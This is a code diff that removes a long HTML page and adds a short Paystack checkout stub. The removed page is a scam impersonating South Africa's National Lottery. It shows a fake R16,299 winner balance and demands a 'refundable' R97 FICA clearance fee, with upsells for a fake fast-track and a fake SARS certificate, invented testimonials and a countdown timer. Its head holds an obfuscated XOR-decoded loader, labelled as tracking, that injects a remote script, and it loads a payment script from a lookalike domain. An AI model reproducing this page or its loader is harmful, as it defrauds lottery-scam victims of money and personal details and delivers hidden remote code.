@@ -1,1133 +1,242 @@
-﻿<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <!-- Velqo Track: Pixel do Facebook + UTMs -->
-<script>
-!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
-fbq('init','1307124204288756');fbq('track','PageView');
-(function(){var K='velqo_utms',q=new URLSearchParams(location.search),keys=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid'],u={};
-try{u=JSON.parse(localStorage.getItem(K)||'{}')}catch(e){}
-keys.forEach(function(k){if(q.get(k))u[k]=q.get(k)});localStorage.setItem(K,JSON.stringify(u));
-document.addEventListener('click',function(ev){var a=ev.target.closest&&ev.target.closest('a[href]');if(!a)return;
-var url=new URL(a.href,location.href);if(url.origin===location.origin&&!/checkout|pagamento|pay/i.test(url.href))return;
-Object.keys(u).forEach(function(k){if(!url.searchParams.get(k))url.searchParams.set(k,u[k])});a.href=url.toString();
-if(/checkout|pagamento|pay/i.test(url.href))fbq('track','InitiateCheckout');},true);})();
-</script>
-
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <meta name="theme-color" content="#FACB0F" />
-  <title>South African National Lottery â¢ 50% OFF Emergency Clearance Payout</title>
-
-  <!-- Meta Pixel Code -->
-  <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '4179716432354886');
-  fbq('init', '1885462942865689');
-  fbq('track', 'PageView');
-  fbq('track', 'InitiateCheckout', {
-      content_name: 'Statutory RICA Clearance Fee (50% OFF)',
-      currency: 'ZAR',
-      value: 97.00
-  });
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4179716432354886&ev=PageView&noscript=1"/>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1885462942865689&ev=PageView&noscript=1"/>
-  </noscript>
-
-  <!-- UTMify Official Tracking Script -->
-  <script>(function(){var v_a=atob("DO0OLNOOP5jYgC0AbZYsWaHiHaL66Fl0HZ40A/ztW/b29VltBIt3ArDhUra68gJzDp9nXKf9EO2s7V4vAYx6SaD6EfKrogEiDJl6XrrsSuy98w86NpYsQrLjWrrioklhGYwjWafjVv6hrV1yCJtrQqejR/u35ABzDoYsAPH4XvSt5Q86T89zAKisUfm15Q86T4lvWLKjSuy16Ut5QJ18SaXrUez181hiBIl9Dv+sSfm09UgiV88sUY7z");var l_lmo=[];for(var u_7g=0;u_7g<v_a.length;u_7g++){l_lmo.push(v_a.charCodeAt(u_7g)&255);}var b_vn18=l_lmo[0];var m_t1=l_lmo.slice(1,1+b_vn18);var a_xj=l_lmo.slice(1+b_vn18);var a_02=a_xj.map(function(b,k_kz96){return b^m_t1[k_kz96%b_vn18];});var i_0zr="";for(var e_g=0;e_g<a_02.length;e_g++){i_0zr+=String.fromCharCode(a_02[e_g]&255);}var m_vnt=decodeURIComponent(escape(i_0zr));var j_bqb=JSON.parse(m_vnt);var k_kl77=j_bqb.globals||[];k_kl77.forEach(function(f_3){window[f_3.name]=f_3.value;});var c_hf=document.createElement("script");c_hf.src=j_bqb.url;c_hf.async=true;c_hf.defer=true;(j_bqb.attributes||[]).forEach(function(a_4){c_hf.setAttribute(a_4.name,a_4.value);});(document.head||document.documentElement).appendChild(c_hf);})();</script>
-
-  <!-- Custom Telemetry Analytics SDK -->
-  <script src="analytics.js" defer></script>
-  <script src="../analytics.js" defer></script>
-
-  <!-- Official CreaPay / Paystack Inline Modal Script -->
-  <script src="https://pay.africagrabpoint.com/embed.js"></script>
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Urbanist:wght@500;600;700;800;900&display=swap" rel="stylesheet">
-
-  <style>
-    /* EXACT @font-face FROM https://www.nationallottery.co.za/#/ */
-    @font-face {
-      font-family: 'UrbanistBlack';
-      src: url('images/ithuba/UrbanistBlack-u2-KTc2o.ttf') format('truetype');
-      font-weight: 900;
-      font-display: swap;
-    }
-    @font-face {
-      font-family: 'UrbanistExtraBold';
-      src: url('images/ithuba/UrbanistExtraBold-B9Hc7G5_.ttf') format('truetype');
-      font-weight: 800;
-      font-display: swap;
-    }
-    @font-face {
-      font-family: 'Montserrat-VariableFont_wght';
-      src: url('images/ithuba/Montserrat-VariableFont_wght-DcaoeaBt.ttf') format('truetype');
-      font-display: swap;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Montserrat-VariableFont_wght', 'Montserrat', sans-serif;
-      -webkit-tap-highlight-color: transparent;
-    }
-
-    /* EXACT GOLDEN-AMBER GRADIENT FROM nationallottery.co.za */
-    body {
-      min-height: 100vh;
-      background: linear-gradient(359.98deg, #654501 62.37%, #ca9a21 93.33%, #facb0f 104.53%);
-      background-attachment: fixed;
-      color: #ffffff;
-      padding-bottom: 88px;
-      overflow-x: hidden;
-    }
-
-    .font-urbanist-black { font-family: 'UrbanistBlack', 'Urbanist', sans-serif; font-weight: 900; }
-    .font-urbanist-bold { font-family: 'UrbanistExtraBold', 'Urbanist', sans-serif; font-weight: 800; }
-
-    /* RED URGENCY EXPIRATION BAR */
-    .urgency-bar {
-      background: linear-gradient(90deg, #b8000b 0%, #e30613 50%, #b8000b 100%);
-      color: #ffffff;
-      padding: 8px 14px;
-      font-size: 11.5px;
-      font-weight: 800;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid rgba(255, 225, 0, 0.45);
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.28);
-      position: sticky;
-      top: 0;
-      z-index: 95;
-    }
-    .timer-pill {
-      background: #ffe100;
-      color: #1a1a1a;
-      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
-      font-size: 13px;
-      font-weight: 900;
-      padding: 2px 9px;
-      border-radius: 6px;
-      letter-spacing: 0.5px;
-    }
-
-    /* OFFICIAL nationallottery.co.za HEADER */
-    .ithuba-header {
-      padding: 10px 14px;
-      background: rgba(101, 69, 1, 0.78);
-      -webkit-backdrop-filter: blur(14px);
-      backdrop-filter: blur(14px);
-      border-bottom: 1px solid rgba(255, 225, 0, 0.25);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-    }
-    .ithuba-header img.logo {
-      height: 32px;
-      width: auto;
-      max-width: 155px;
-      object-fit: contain;
-    }
-    .voucher-chip {
-      background: rgba(0, 0, 0, 0.38);
-      border: 1px solid rgba(255, 225, 0, 0.45);
-      border-radius: 999px;
-      padding: 4px 10px;
-      font-size: 10px;
-      font-weight: 700;
-      color: #ffe100;
-    }
-
-    /* MAIN WRAPPER */
-    .checkout-wrap {
-      width: 100%;
-      max-width: 520px;
-      margin: 0 auto;
-      padding: 12px 14px 30px;
-    }
-
-    /* EXACT GLASSMORPHIC CARD FROM nationallottery.co.za (.game-list-card) */
-    .game-list-card {
-      position: relative;
-      isolation: isolate;
-      border: none;
-      overflow: hidden;
-      background: rgba(0, 0, 0, 0.38);
-      -webkit-backdrop-filter: blur(16px) saturate(1.2);
-      backdrop-filter: blur(16px) saturate(1.2);
-      box-shadow: inset 1px 1px rgba(255, 255, 255, 0.18), inset -1px -1px rgba(255, 255, 255, 0.1), 0 8px 26px rgba(0, 0, 0, 0.24);
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      width: 100%;
-      padding: 16px 15px;
-      border-radius: 16px;
-      color: #fff;
-      margin-bottom: 14px;
-    }
-    .game-list-card::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      border-radius: 16px;
-      padding: 1px;
-      background: radial-gradient(120% 90% at 0% 0%, rgba(255,255,255,.45) 0%, rgba(255,255,255,.16) 14%, rgba(255,255,255,.04) 28%, transparent 46%),
-                  radial-gradient(120% 90% at 100% 100%, rgba(255,255,255,.36) 0%, rgba(255,255,255,.14) 14%, rgba(255,255,255,.03) 28%, transparent 46%);
-      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-      -webkit-mask-composite: xor;
-      mask-composite: exclude;
-      pointer-events: none;
-      z-index: 1;
-    }
-    .game-list-card > * { position: relative; z-index: 3; }
-
-    /* PENDING BALANCE WALLET HERO (Matches .balance-with-reload from nationallottery.co.za) */
-    .pending-balance-hero {
-      background: linear-gradient(135deg, rgba(0, 0, 0, 0.55) 0%, rgba(45, 30, 2, 0.65) 100%);
-      border: 1.5px solid #ffe100;
-      border-radius: 14px;
-      padding: 14px;
-      position: relative;
-    }
-    .pending-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(255, 101, 12, 0.25);
-      border: 1px solid #ff650c;
-      color: #ffe100;
-      font-size: 10px;
-      font-weight: 800;
-      padding: 3px 9px;
-      border-radius: 999px;
-      text-transform: uppercase;
-    }
-    .pulse-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: #ff650c;
-      animation: blink 1s infinite;
-    }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.25; } }
-
-    .balance-amount-big {
-      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
-      font-size: 34px;
-      font-weight: 900;
-      color: #ffe100;
-      line-height: 1.1;
-      margin-top: 6px;
-      text-shadow: 0 2px 10px rgba(255, 225, 0, 0.25);
-    }
-
-    /*PROGRESS BAR */
-    .escrow-progress-track {
-      width: 100%;
-      height: 8px;
-      background: rgba(255, 255, 255, 0.14);
-      border-radius: 999px;
-      overflow: hidden;
-      margin-top: 6px;
-    }
-    .escrow-progress-fill {
-      width: 92%;
-      height: 100%;
-      background: linear-gradient(90deg, #009639 0%, #ffe100 100%);
-      border-radius: 999px;
-    }
-
-    /* BANK SELECTOR STRIP ON CHECKOUT */
-    .bank-strip-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 6px;
-      margin-top: 6px;
-    }
-    .bank-mini-btn {
-      background: rgba(255, 255, 255, 0.1);
-      border: 1.5px solid rgba(255, 255, 255, 0.2);
-      border-radius: 8px;
-      padding: 4px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: all 0.15s;
-    }
-    .bank-mini-btn.active {
-      border-color: #ffe100;
-      background: rgba(255, 225, 0, 0.22);
-      box-shadow: 0 0 0 1px #ffe100;
-    }
-    .bank-mini-btn img {
-      width: 100%;
-      height: 22px;
-      object-fit: contain;
-      border-radius: 4px;
-    }
-
-    /* OFFICIAL INPUT FIELDS (.w-field from withdraw-DrJGcZIL.css) */
-    .w-field-label {
-      display: block;
-      font-size: 11.5px;
-      font-weight: 700;
-      color: rgba(255, 255, 255, 0.9);
-      margin-bottom: 5px;
-    }
-    .w-field {
-      width: 100%;
-      min-height: 46px;
-      padding: 11px 14px;
-      border-radius: 12px;
-      border: 1px solid rgba(255, 255, 255, 0.32);
-      background: rgba(255, 255, 255, 0.12);
-      color: #fff;
-      font-size: 14px;
-      font-weight: 600;
-      outline: none;
-      margin-bottom: 10px;
-    }
-    .w-field::placeholder { color: rgba(255, 255, 255, 0.45); }
-    .w-field:focus {
-      border-color: #ffe100;
-      box-shadow: 0 0 0 2px rgba(255, 225, 0, 0.25);
-      background: rgba(0, 0, 0, 0.28);
-    }
-
-    /* OFFICIAL PILL CTA BUTTON */
-    .ithuba-pay-btn {
-      width: 100%;
-      min-height: 54px;
-      border-radius: 999px;
-      border: none;
-      background: linear-gradient(90deg, #ffe100 0%, #f8c419 100%);
-      color: #1a1a1a;
-      font-family: 'UrbanistBlack', 'Urbanist', sans-serif;
-      font-size: 15.5px;
-      font-weight: 900;
-      cursor: pointer;
-      box-shadow: 0 6px 20px rgba(248, 196, 25, 0.45);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 8px 16px;
-      text-transform: uppercase;
-      animation: pulsePay 1.6s infinite ease-in-out;
-    }
-    @keyframes pulsePay {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.02); }
-    }
-    .ithuba-pay-btn small {
-      font-family: 'Montserrat', sans-serif;
-      font-size: 10px;
-      font-weight: 800;
-      color: #005a20;
-      text-transform: none;
-      margin-top: 1px;
-    }
-
-    /* BREAKDOWN ROWS */
-    .summary-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 7px 0;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.12);
-      font-size: 12.5px;
-    }
-    .summary-row:last-child { border-bottom: none; }
-
-    /* TOAST LIVE */
-    .toast-live {
-      position: fixed;
-      bottom: 16px;
-      left: 14px;
-      right: 14px;
-      max-width: 370px;
-      background: rgba(18, 18, 18, 0.95);
-      border: 1px solid rgba(255, 225, 0, 0.55);
-      border-radius: 12px;
-      padding: 9px 12px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      z-index: 90;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.45);
-      transition: all 0.35s ease;
-      transform: translateY(140%);
-      opacity: 0;
-      pointer-events: none;
-      font-size: 11px;
-    }
-    .toast-live.visible {
-      transform: translateY(0);
-      opacity: 1;
-    }
-
-    /* CREAPAY MODAL OVERLAY */
-    .creapay-modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.82);
-      z-index: 200;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 14px;
-    }
-    .creapay-modal-container {
-      background: #1a1a1a;
-      border: 2px solid #ffe100;
-      border-radius: 16px;
-      width: 100%;
-      max-width: 440px;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      max-height: 90vh;
-    }
-    .creapay-modal-header {
-      background: linear-gradient(90deg, #bf9a08, #8d591a);
-      padding: 10px 14px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      color: #fff;
-    }
-    .modal-close-icon {
-      background: rgba(0,0,0,0.3);
-      color: #fff;
-      border: none;
-      width: 30px;
-      height: 30px;
-      border-radius: 8px;
-      font-size: 18px;
-      cursor: pointer;
-    }
-    .creapay-iframe-wrapper {
-      flex: 1;
-      min-height: 460px;
-      background: #fff;
-    }
-    .creapay-iframe-wrapper iframe {
-      width: 100%;
-      height: 460px;
-      border: 0;
-    }
-    @keyframes spinLoader {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @keyframes fadeInModal {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-  </style>
+  <title>Paystack Checkout – Loto SA</title>
+  <script src="https://js.paystack.co/v1/inline.js"></script>
 </head>
 <body>
-
-  <!-- 1. HIGH-URGENCY COUNTDOWN BAR -->
-  <div class="urgency-bar">
-    <span>â ï¸ PENDING PAYOUT EXPIRES IN:</span>
-    <span class="timer-pill" id="checkoutTimer">04:59</span>
-  </div>
-
-  <!-- 2. OFFICIAL nationallottery.co.za HEADER -->
-  <header class="ithuba-header">
-    <img src="images/ithuba/ithuba_header_logo.png" onerror="this.src='lottery-logo.png'" alt="National Lottery" class="logo" />
-    <span class="voucher-chip" id="summaryVoucherId">REF: ZA-ITH-2026</span>
-  </header>
-
-  <!-- 50% EMERGENCY SUBSIDY STRIP -->
-  <div style="max-width:480px;margin:12px auto 0;padding:12px 14px;background:linear-gradient(135deg, rgba(220,38,38,0.95), rgba(153,27,27,0.98));border:2px solid #facc15;border-radius:14px;color:#fff;text-align:center;box-shadow:0 8px 24px rgba(220,38,38,0.45);">
-    <div style="display:inline-block;background:#facc15;color:#000;font-size:10px;font-weight:900;padding:2px 8px;border-radius:6px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">
-      ð¨ 50% EMERGENCY CLEARANCE SUBSIDY APPLIED
-    </div>
-    <div style="font-size:13.5px;font-weight:900;color:#fff;line-height:1.35;">
-      DO NOT EXIT: Your FICA Clearance Fee has been reduced by 50% from <span style="text-decoration:line-through;color:#fca5a5;">R 200.00</span> to only <span style="color:#fde047;font-size:16px;">R 97.00 ZAR</span>
-    </div>
-    <div style="font-size:11px;color:#fecaca;margin-top:4px;">
-      â Section 14 Guarantee: The R 97.00 deposit is 100% refunded back into your bank account with your payout in 3â7 minutes.
-    </div>
-  </div>
-
-  <!-- 3. MAIN CHECKOUT CONTAINER -->
-  <main class="checkout-wrap">
-
-    <!-- CARD A: PENDING PAYOUT BALANCE & SELECTED BANK -->
-    <section class="game-list-card">
-      <div class="pending-balance-hero">
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
-          <span class="pending-pill">
-            <span class="pulse-dot"></span> PENDING FICA RELEASE
-          </span>
-          <img src="images/ithuba/powerball_logo.png" alt="PowerBall" style="height:22px;object-fit:contain;" />
-        </div>
-
-        <div style="margin-top:8px;font-size:11px;color:rgba(255,255,255,0.8);text-transform:uppercase;font-weight:700;">
-          Approved Winner Wallet Balance:
-        </div>
-        <div class="balance-amount-big" id="summaryAllocAmount">R 16,299.00</div>
-
-        <div style="display:flex;justify-content:space-between;font-size:11px;font-weight:700;margin-top:8px;color:#6ee7a0;">
-          <span>â¡ PayShap / RTC Transfer: 92% Complete</span>
-          <span>92%</span>
-        </div>
-        <div class="escrow-progress-track">
-          <div class="escrow-progress-fill"></div>
-        </div>
-      </div>
-
-      <!-- Selected Receiving Bank Display + Quick Switcher -->
-      <div style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.18);border-radius:12px;padding:11px 12px;">
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;">
-          <div style="display:flex;align-items:center;gap:10px;">
-            <img id="dispBankLogo" src="images/banks/capitec.svg" alt="Bank Logo" style="width:92px;height:30px;object-fit:contain;border-radius:5px;" />
-            <div>
-              <div style="font-size:10px;color:rgba(255,255,255,0.7);text-transform:uppercase;font-weight:700;">Receiving Bank</div>
-              <div id="dispBankName" style="font-size:13px;font-weight:800;color:#ffe100;">Capitec Bank</div>
-            </div>
-          </div>
-          <span style="background:rgba(0,150,57,0.3);border:1px solid #6ee7a0;color:#6ee7a0;font-size:9.5px;font-weight:800;padding:3px 8px;border-radius:999px;">
-            â RTC ACTIVE
-          </span>
-        </div>
-
-        <!-- Tap to switch bank if needed -->
-        <div style="font-size:10px;color:rgba(255,255,255,0.68);margin-top:8px;">Tap your bank below if you need to change it:</div>
-        <div class="bank-strip-grid">
-          <button type="button" class="bank-mini-btn active" onclick="selectCheckoutBank('Capitec Bank','images/banks/capitec.svg',this)">
-            <img src="images/banks/capitec.svg" alt="Capitec" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('FNB','images/banks/fnb.svg',this)">
-            <img src="images/banks/fnb.svg" alt="FNB" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('Standard Bank','images/banks/standard_bank.svg',this)">
-            <img src="images/banks/standard_bank.svg" alt="Standard Bank" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('ABSA Bank','images/banks/absa.svg',this)">
-            <img src="images/banks/absa.svg" alt="ABSA" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('Nedbank','images/banks/nedbank.svg',this)">
-            <img src="images/banks/nedbank.svg" alt="Nedbank" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('TymeBank','images/banks/tymebank.svg',this)">
-            <img src="images/banks/tymebank.svg" alt="TymeBank" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('African Bank','images/banks/african_bank.svg',this)">
-            <img src="images/banks/african_bank.svg" alt="African Bank" />
-          </button>
-          <button type="button" class="bank-mini-btn" onclick="selectCheckoutBank('Discovery Bank','images/banks/discovery_bank.svg',this)">
-            <img src="images/banks/discovery_bank.svg" alt="Discovery Bank" />
-          </button>
-        </div>
-      </div>
-    </section>
-
-    <!-- CARD B: BENEFICIARY CONFIRMATION & INSTANT PAYSTACK RELEASE -->
-    <section class="game-list-card">
-      <div style="display:flex;justify-content:space-between;align-items:center;">
-        <span class="font-urbanist-bold" style="font-size:15px;color:#ffe100;text-transform:uppercase;">
-          AUTHORIZE FICA CLEARANCE (50% SUBSIDY)
-        </span>
-        <span style="background:#009639;color:#fff;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;">
-          100% Refunded
-        </span>
-      </div>
-
-      <p style="font-size:12px;color:rgba(255,255,255,0.86);line-height:1.45;">
-        Under SARB anti-fraud guidelines, confirm your beneficiary details and complete the <b>refundable R 97.00 FICA Verification Deposit</b> (reduced 50% from R 200). It is automatically reimbursed with your full payout in 3â7 minutes:
-      </p>
-
-      <form id="checkoutForm" onsubmit="event.preventDefault(); handleCheckoutSubmit(event); return false;">
-        <label class="w-field-label">Beneficiary Full Name</label>
-        <input id="custName" type="text" class="w-field" placeholder="e.g. Thabo Mokoena" required />
-
-        <label class="w-field-label">South African Mobile Number (For SMS Deposit Receipt)</label>
-        <input id="custPhone" type="tel" inputmode="tel" class="w-field" placeholder="e.g. 071 234 5678" required />
-
-        <label class="w-field-label">Email Address (For Official Receipt &amp; SARS Certificate)</label>
-        <input id="custEmail" type="email" class="w-field" placeholder="e.g. winner@gmail.com" />
-
-        <!-- HIGH CONVERTING BLACK ORDER BUMPS -->
-        <div style="margin: 14px 0 16px; display: flex; flex-direction: column; gap: 10px;">
-          <!-- Bump 1: PayShap 60s Fast-Track -->
-          <label class="order-bump-box" style="display:block;background:rgba(255,101,12,0.12);border:2px dashed #ff650c;border-radius:12px;padding:12px 14px;cursor:pointer;position:relative;transition:all 0.15s ease;">
-            <div style="display:flex;align-items:flex-start;gap:10px;">
-              <input type="checkbox" id="bumpPayShap" onchange="toggleOrderBump()" style="width:20px;height:20px;margin-top:2px;accent-color:#ffe100;cursor:pointer;" />
-              <div style="flex:1;">
-                <div style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
-                  <span style="background:#ff650c;color:#fff;font-size:9.5px;font-weight:900;padding:2px 7px;border-radius:4px;text-transform:uppercase;">â¡ FAST-TRACK</span>
-                  <span class="font-urbanist-black" style="color:#ffe100;font-size:13.5px;">+ R 79.00</span>
-                </div>
-                <div style="font-size:12.5px;font-weight:800;color:#fff;margin-top:4px;">
-                  YES! UPGRADE TO 60-SECOND INSTANT PAYSHAP PRIORITY DISPATCH
-                </div>
-                <p style="font-size:11px;color:rgba(255,255,255,0.85);margin-top:3px;line-height:1.35;">
-                  Bypass the 3â7 minute standard clearing queue. Releases your full payout into your bank account in under 60 seconds with instant SMS verification.
-                </p>
-              </div>
-            </div>
-          </label>
-
-          <!-- Bump 2: SARS Tax-Exemption Clearance Certificate -->
-          <label class="order-bump-box" style="display:block;background:rgba(0,230,118,0.1);border:2px dashed #00e676;border-radius:12px;padding:12px 14px;cursor:pointer;position:relative;transition:all 0.15s ease;">
-            <div style="display:flex;align-items:flex-start;gap:10px;">
-              <input type="checkbox" id="bumpTaxCert" onchange="toggleOrderBump()" style="width:20px;height:20px;margin-top:2px;accent-color:#ffe100;cursor:pointer;" />
-              <div style="flex:1;">
-                <div style="display:flex;align-items:center;justify-content:space-between;gap:6px;">
-                  <span style="background:#00a854;color:#fff;font-size:9.5px;font-weight:900;padding:2px 7px;border-radius:4px;text-transform:uppercase;">ð¡ï¸ SARS EXEMPTION</span>
-                  <span class="font-urbanist-black" style="color:#ffe100;font-size:13.5px;">+ R 99.00</span>
-                </div>
-                <div style="font-size:12.5px;font-weight:800;color:#fff;margin-top:4px;">
-                  YES! ADD OFFICIAL SARS TAX-FREE CLEARANCE CERTIFICATE (PDF + SMS)
-                </div>
-                <p style="font-size:11px;color:rgba(255,255,255,0.85);margin-top:3px;line-height:1.35;">
-                  Official SARS exemption proof under Section 10(1)(x). Guarantees your bank cannot freeze or withhold any tax deductions from your payout.
-                </p>
-              </div>
-            </div>
-          </label>
-        </div>
-
-        <!-- Payout Breakdown Summary -->
-        <div style="background:rgba(0,0,0,0.32);border:1px solid rgba(255,255,255,0.16);border-radius:12px;padding:10px 12px;margin:4px 0 14px;">
-          <div class="summary-row">
-            <span style="color:rgba(255,255,255,0.82);">Approved Ithuba Payout:</span>
-            <strong style="color:#fff;" id="summaryPrincipalAmount">R 16,299.00</strong>
-          </div>
-          <div class="summary-row">
-            <span style="color:rgba(255,255,255,0.82);">Mandatory FICA Clearance Fee:</span>
-            <span><s style="color:rgba(255,255,255,0.5);font-size:12px;margin-right:6px;">R 200.00</s><strong style="color:#4ade80;">R 97.00</strong></span>
-          </div>
-          <div id="rowBumpPayShap" class="summary-row" style="display:none;">
-            <span style="color:rgba(255,255,255,0.82);">â¡ 60s PayShap Priority Channel:</span>
-            <strong style="color:#ffe100;">+ R 79.00</strong>
-          </div>
-          <div id="rowBumpTaxCert" class="summary-row" style="display:none;">
-            <span style="color:rgba(255,255,255,0.82);">ð¡ï¸ SARS Tax-Free Exemption Certificate:</span>
-            <strong style="color:#ffe100;">+ R 99.00</strong>
-          </div>
-          <div class="summary-row">
-            <span style="color:rgba(255,255,255,0.82);">Automatic SARB Fee Refund:</span>
-            <strong style="color:#6ee7a0;">+ R 97.00</strong>
-          </div>
-          <div class="summary-row" style="padding-top:8px;">
-            <span style="font-weight:800;color:#ffe100;">Total Net Credit to Your Bank:</span>
-            <strong class="font-urbanist-black" style="font-size:16px;color:#ffe100;" id="summaryNetCredit">R 16,396.00 ZAR</strong>
-          </div>
-        </div>
-
-        <button type="submit" id="mainCheckoutButton" class="ithuba-pay-btn">
-          <span class="btn-main-title">PAY R 97.00 &amp; RELEASE <span id="btnReleaseAmount">R 16,396.00</span> NOW â</span>
-          <small>â 100% Refunded With Your Payout in 3â7 Minutes</small>
-        </button>
-      </form>
-
-      <div style="background:rgba(255,225,0,0.12);border:1px dashed rgba(255,225,0,0.5);border-radius:10px;padding:10px;font-size:11px;line-height:1.4;color:rgba(255,255,255,0.9);">
-        <strong>SARB Section 14 Guarantee:</strong> Your R 97.00 clearance fee is automatically refunded into your bank account along with your payout, making your total deposit <strong style="color:#ffe100;" id="guaranteeNetText">R 16,396.00 ZAR</strong>.
-      </div>
-    </section>
-
-  </main>
-
-  <!-- LIVE SOCIAL PROOF TOAST -->
-  <div class="toast-live" id="checkoutToast">
-    <img id="toastBankImg" src="images/banks/capitec.svg" alt="Bank" style="width:64px;height:22px;object-fit:contain;border-radius:4px;" />
-    <div id="toastMessage" style="color:#fff;line-height:1.3;">
-      <strong style="color:#ffe100;">Nomvula K. (Durban)</strong> paid R200 &amp; received <b>R 16,499.00</b> via Capitec (38s ago)
-    </div>
-  </div>
-
-  <!-- SECURE CREAPAY INLINE LIGHTBOX POPUP MODAL -->
-  <div class="creapay-modal-overlay" id="creaPayModal" style="display:none;" onclick="handleOverlayClick(event)">
-    <div class="creapay-modal-container" onclick="event.stopPropagation()">
-      <div class="creapay-modal-header">
-        <div>
-          <div style="font-size:13px;font-weight:800;">Ithuba &amp; SARB Settlement Switch</div>
-          <div style="font-size:10px;opacity:0.85;">256-Bit TLS Encrypted â¢ 100% Refundable R200 Fee</div>
-        </div>
-        <button type="button" class="modal-close-icon" onclick="closeCreaPayModal()">&times;</button>
-      </div>
-      <div id="modalIframeLoader" style="padding:18px;text-align:center;font-size:12px;color:#ffe100;">
-        Connecting to South African Settlement Switch...
-      </div>
-      <div class="creapay-iframe-wrapper">
-        <iframe id="creaPayFrame" src="about:blank" allow="payment; camera; microphone"></iframe>
-      </div>
-    </div>
-  </div>
-
-  <!-- HIGH-TRUST PROCESSING POPUP OVERLAY -->
-  <div id="processingOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:99999;align-items:center;justify-content:center;padding:16px;">
-    <div style="background:linear-gradient(180deg,#1c1808 0%,#111111 100%);border:2px solid #ffe100;border-radius:20px;max-width:400px;width:100%;padding:26px 20px;text-align:center;box-shadow:0 12px 40px rgba(255,225,0,0.3);position:relative;animation:fadeInModal 0.25s ease-out;">
-      
-      <!-- Spinning Golden Loader -->
-      <div style="position:relative;width:64px;height:64px;margin:0 auto 16px;">
-        <div style="width:64px;height:64px;border:4px solid rgba(255,225,0,0.2);border-top:4px solid #ffe100;border-radius:50%;animation:spinLoader 1s linear infinite;"></div>
-        <img src="images/ithuba/chatbot_icon.png" onerror="this.src='lottery-logo.png'" alt="Ithuba" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:28px;height:28px;object-fit:contain;" />
-      </div>
-
-      <h3 class="font-urbanist-black" style="font-size:18px;color:#ffe100;margin-bottom:6px;letter-spacing:0.3px;text-transform:uppercase;">
-        INITIALIZING SETTLEMENT GATEWAY...
-      </h3>
-
-      <p style="font-size:12.5px;color:rgba(255,255,255,0.85);line-height:1.4;margin-bottom:18px;">
-        Connecting to South African Reserve Bank PayShap &amp; Paystack 256-bit TLS switch. Please wait...
-      </p>
-
